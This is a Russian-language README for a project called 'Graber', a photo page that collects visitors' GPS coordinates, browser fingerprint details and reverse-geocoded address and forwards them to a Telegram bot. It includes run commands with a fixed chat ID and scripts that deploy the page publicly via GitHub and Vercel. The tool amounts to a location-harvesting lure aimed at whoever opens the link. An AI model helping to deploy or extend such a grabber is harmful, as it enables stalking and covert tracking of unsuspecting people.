# Страница с фото и отправкой геолокации в Telegram

## Безопасность

- **Токен бота нельзя вставлять в HTML/JS** — его увидит любой посетитель.
- Если токен уже светился в чате или в коде — **создайте новый** в [@BotFather](https://t.me/BotFather) (Revoke / новый токен).

## Запуск (Windows, PowerShell)

```powershell
cd $HOME\Desktop\Graber
$env:TELEGRAM_BOT_TOKEN = "ВАШ_НОВЫЙ_ТОКЕН"
$env:TELEGRAM_CHAT_ID = "6248342909"
python server.py
```

Откройте в браузере: `http://127.0.0.1:8765/`

На телефоне в той же Wi‑Fi сети: `http://IP_ВАШЕГО_ПК:8765/` (точное GPS обычно работает лучше с телефона).

## Что собирается

- Координаты и метаданные GPS (после **системного** разрешения браузера).
- Данные окружения браузера (User-Agent, экран, язык, часовой пояс и т.д.).
- Примерный адрес через обратное геокодирование (Nominatim) на сервере.

Точность как у навигатора возможна только при разрешении геолокации и нормальном сигнале GPS/сети.

## GitHub (автоматически)

Один скрипт создаёт репозиторий `Graber` у вашего пользователя (если ещё нет), пушит `main` и деплоит на Vercel.

1. [Fine-grained PAT](https://github.com/settings/personal-access-tokens) с правами **Contents: Read and write** и **Metadata: read** для нужных репозиториев (или classic PAT с scope **`repo`**).
2. [Vercel Token](https://vercel.com/account/tokens).
3. Скопируйте `.env.publish.example` → `.env.publish`, вставьте токены (файл в `.gitignore`, не коммитьте).
4. В PowerShell из корня проекта:

```powershell
cd $HOME\Desktop\Graber
powershell -ExecutionPolicy Bypass -File .\scripts\publish.ps1
```

Опционально в `.env.publish` добавьте `TELEGRAM_BOT_TOKEN` и `TELEGRAM_CHAT_ID` — скрипт пропишет их в Vercel Production и передеплоит.

### Вручную

```powershell
git remote add origin https://github.com/ВАШ_ЛОГИН/ИМЯ_РЕПО.git
git push -u origin main
```

Либо [GitHub CLI](https://cli.github.com/): `gh repo create ... --push`.

## Vercel

Проект: статические `index.html`, `geolocation.html`, изображение и serverless **Python** `api/report.py` (тот же путь `POST /api/report`, что и у локального `server.py`).

1. Импортируйте репозиторий в [Vercel](https://vercel.com/new) **или** из каталога проекта: `npx vercel` (первый раз откроется браузер для входа).
2. В **Settings → Environment Variables** добавьте:
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`
3. Задеплойте (Production). После деплоя откройте выданный URL — кнопка на главной странице снова бьёт в `/api/report` на Vercel.

**Если в интерфейсе «Telegram … 404»:** у [Bot API](https://core.telegram.org/bots/api) ответ **404** почти всегда значит **неверный или отозванный** `TELEGRAM_BOT_TOKEN`. Задайте заново токен из [@BotFather](https://t.me/BotFather), сохраните в Vercel для **Production** и сделайте **Redeploy** (без redeploy старые переменные не подхватятся).

Локальный запуск по-прежнему через `python server.py` с теми же переменными в окружении.
